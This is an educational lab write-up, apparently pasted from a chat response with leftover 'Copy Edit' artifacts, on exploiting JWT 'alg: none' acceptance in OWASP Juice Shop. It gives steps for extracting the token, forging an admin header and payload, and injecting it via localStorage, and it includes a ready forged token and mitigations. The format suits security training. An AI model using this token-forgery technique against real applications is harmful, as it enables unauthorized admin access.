# 🚫 Attack: JWT None Algorithm Exploit

## 🎯 Objective
Exploit a misconfigured JWT validation process where the application accepts `alg: none` and **skips verifying the signature**, allowing forged admin tokens.

---

## 🧠 Required Knowledge

- JWT structure: Header, Payload, Signature
- JWT algorithms: `HS256`, `RS256`, `none`
- LocalStorage-based JWT auth
- Base64 encoding/decoding

---

## 🛠️ Tools & Technologies

- OWASP Juice Shop
- Burp Suite / DevTools Console
- jwt.io or any JWT editor
- Kali Linux (optional: `jwt_tool.py`)

---

## 🧩 MITRE ATT&CK Mapping

- **T1606.002** – Forge Web Token
- **T1078** – Valid Accounts (Abuse of Trust Mechanisms)

---

## 📜 Step-by-Step Execution

### 🔹 1. Login as a Normal User

Use credentials like:
test@local.sh / 123456

css
Copy
Edit

### 🔹 2. Extract the JWT Token

In browser console:
```js
localStorage.getItem('token');
🔹 3. Decode the Token
Use https://jwt.io

🔹 4. Modify JWT Header and Payload
Set header:

json
Copy
Edit
{
  "alg": "none",
  "typ": "JWT"
}
Set payload:

json
Copy
Edit
{
  "email": "admin@juice-sh.op",
  "role": "admin"
}
Remove the signature completely (leave only Header.Payload.).

Final format:

php-template
Copy
Edit
<base64Header>.<base64Payload>.
🔹 5. Replace Token in Browser
In DevTools Console:

js
Copy
Edit
localStorage.setItem("token", "forged_token_here.");
🔹 6. Refresh the Page
Visit:

bash
Copy
Edit
http://localhost:3000/#/administration
You should now have admin access.

✅ Success Criteria
Access to admin dashboard

Scoreboard shows ✅ “Login with administrator account”

📸 POC

🛡️ Mitigations
NEVER allow alg: none on the server

Always validate token signatures

Use vetted libraries (e.g., jsonwebtoken) with secure defaults

Enforce algorithm whitelisting

🔗 References
JWT None Algorithm Vulnerability

JWT.IO

yaml
Copy
Edit

---

### 📋 Step 2: Create `TO-DO.md`

```bash
nano JWT-None-Algorithm-Exploit/TO-DO.md
Paste:

markdown
Copy
Edit
# ✅ TO-DO – JWT None Algorithm Exploit

- [x] Login as test user
- [x] Extract original JWT
- [x] Modify header: `"alg": "none"`
- [x] Remove signature and inject forged token
- [x] Access /#/administration
- [ ] Add screenshot of header & payload (optional)


```markdown
# 🚫 Attack Lab: JWT "None" Algorithm Exploit

## 🎯 Objective

Exploit a misconfigured JWT validation mechanism where the server improperly accepts `alg: none`, resulting in the **bypass of signature verification**. This allows an attacker to **forge a valid admin token** without knowledge of the secret key and escalate privileges within the application.

---

## 🧠 Required Knowledge

### 🔸 JSON Web Token (JWT) Structure
A JWT consists of three parts:
```

\<base64url(Header)>.\<base64url(Payload)>.<Signature>

````

When `alg: none` is accepted by the server, the **Signature** component is ignored entirely, allowing attackers to pass arbitrary content as long as it's correctly formatted.

### 🔸 JWT Algorithms
- **HS256**: Symmetric key, requires secret
- **RS256**: Asymmetric key with public/private key pair
- **none**: Indicates that **no digital signature or MAC** is used (intended only for testing or disabled implementations)

### 🔸 Key Concepts
- LocalStorage/session tokens used for auth
- Base64URL encoding/decoding (not standard Base64)
- Trust boundaries in client-server authentication

---

## 🛠️ Tools & Technologies

| Tool | Purpose |
|------|---------|
| **OWASP Juice Shop** | Vulnerable Node.js app with JWT-based auth |
| **Burp Suite** | Intercept and modify tokens |
| **Browser DevTools** | View/edit LocalStorage JWT |
| **jwt.io** | Visual decode/edit of JWT token |
| **Kali Linux + jwt_tool.py** | Optional CLI token generation |

---

## 🧩 MITRE ATT&CK Mapping

| Technique | Description |
|----------|-------------|
| **T1606.002** | *Forge Web Token* – Create a token with manipulated claims |
| **T1078** | *Valid Accounts* – Abuse of trust via forged identity |

---

## 📜 Step-by-Step Execution

### 🔹 1. Log In as a Normal User

1. Navigate to `http://localhost:3000`
2. Register and log in using normal credentials (e.g. `user@juice-sh.op`)
3. Open browser DevTools → `Application → LocalStorage`
4. Copy the JWT token from the `token` key

---

### 🔹 2. Decode JWT and Analyze

Paste the token into [https://jwt.io](https://jwt.io):

- View the header:
  ```json
  {
    "alg": "HS256",
    "typ": "JWT"
  }
````

* View the payload:

  ```json
  {
    "email": "user@juice-sh.op",
    "role": "customer"
  }
  ```

---

### 🔹 3. Modify Algorithm to "none" and Forge Payload

#### 🔸 Header:

```json
{
  "alg": "none",
  "typ": "JWT"
}
```

#### 🔸 Payload:

```json
{
  "email": "admin@juice-sh.op",
  "role": "admin"
}
```

1. Base64URL-encode both header and payload.
2. Concatenate them with a `.` and **omit** the signature:

   ```
   <base64url(header)>.<base64url(payload)>.
   ```

#### 🔸 Example (no signature):

```
eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJlbWFpbCI6ImFkbWluQGp1aWNlLXNoLm9wIiwicm9sZSI6ImFkbWluIn0.
```

> Note: Ensure there's a trailing dot `.` to denote the empty signature.

---

### 🔹 4. Inject the Forged Token

1. Go back to DevTools → `Application → LocalStorage`
2. Replace the original token with the newly forged `alg: none` token
3. Refresh the browser
4. Navigate to `/administration` or attempt admin-level actions

If the server is misconfigured and accepts `alg: none`, **you are now authenticated as an admin** without needing a valid signature.

---

## 🔬 Post-Exploitation Observations

* The server-side JWT validation logic **failed to enforce proper algorithm verification**.
* Accepting `alg: none` violates RFC 7518 recommendations.
* This allows **authentication bypass** and full privilege escalation.

---

## 🛡️ Mitigation Strategies

| Problem                     | Mitigation                                                            |
| --------------------------- | --------------------------------------------------------------------- |
| Insecure algorithm fallback | Disallow `alg: none` on the server entirely                           |
| Algorithm confusion         | Use JWT libraries that validate algorithms strictly                   |
| Token trust                 | Never rely solely on unsigned claims for identity                     |
| Token integrity             | Always verify the cryptographic signature against a known, strong key |

---

## 🧠 Final Thoughts

This exploit takes advantage of a simple but **critical misconfiguration**: trusting tokens that lack cryptographic signatures. JWTs are designed to be **tamper-proof**, but when `alg: none` is allowed, the integrity guarantee is nullified.

Security researchers should always check:

* Whether tokens can be replayed without a valid signature
* If the server honors `alg` specified in the header
* Whether client-supplied data is fully trusted in auth logic

This attack is especially dangerous in:

* Custom-built JWT implementations
* Legacy or poorly maintained Node.js or PHP apps
* Systems where developer mode or debug configurations are left enabled

---

```
```

